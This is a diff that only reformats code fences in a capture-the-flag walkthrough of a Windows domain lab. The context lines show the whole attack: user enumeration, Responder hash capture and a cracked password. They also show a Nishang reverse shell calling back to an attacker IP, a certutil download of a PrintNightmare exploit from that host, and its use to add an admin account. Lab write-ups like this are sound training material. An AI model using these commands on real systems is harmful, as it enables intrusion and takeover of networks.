@@ -53,6 +53,9 @@ Initial enumeration using **enum4linux** and **kerbrute** confirms the domain na
 
 ```zsh
 $ enum4linux -a 10.81.130.174
+```
+
+```zsh
 $ ./kerbrute_linux_amd64 userenum -d VULNNET.local --dc 10.81.130.174 users3.txt
 ```
 
@@ -88,7 +91,7 @@ $ sudo responder -I tun0 -dwv # Start Responder on the attacker machine
 
 Responder captures the hash for user **enterprise-security**.
 
-```
+```text
 [SMB] NTLMv2-SSP Hash : enterprise-security::VULNNET:...
 ```
 
@@ -110,7 +113,7 @@ $ enum4linux -u enterprise-security -p sand_0873959498 -a 10.81.130.174
 An interesting share named **Enterprise-Share** is found. Inside, there is a PowerShell script:  
 * PurgeIrrelevantData_1826.ps1
 
-```PowerShell
+```text
 # Content of the script:
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
@@ -121,13 +124,16 @@ rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 
 Since our user has write access to this share, we can replace the script with a **Nishang** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell:  
 
-```zsh
+```text
 # Append payload to the Nishang script:
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444
 ```
 
 ```zsh
 $ smbclient //10.81.130.174/Enterprise-Share -U VULNNET.local/enterprise-security%sand_0873959498
+```
+
+```PowerShell
 > put PurgeIrrelevantData_1826.ps1
 ```
 
@@ -144,6 +150,9 @@ Checking the **Spooler** service and missing patches for CVE-2021-34527:
 
 ```PowerShell
 > Get-Service Spooler # Status: Running
+```
+
+```PowerShell
 > Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" } # Result: Empty
 ```
 
@@ -155,7 +164,13 @@ We upload a **PrintNightmare** exploit (https://github.com/calebstewart/CVE-2021
 
 ```PowerShell
 > certutil -urlcache -split -f http://192.168.144.226/CVE-2021-1675.ps1 C:\Users\enterprise-security\Desktop\nightmare.ps1
+```
+
+```PowerShell
 > Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1
+```
+
+```PowerShell
 > Invoke-Nightmare -NewUser "overmane" -NewPassword "Passwd123"
 ```  
 
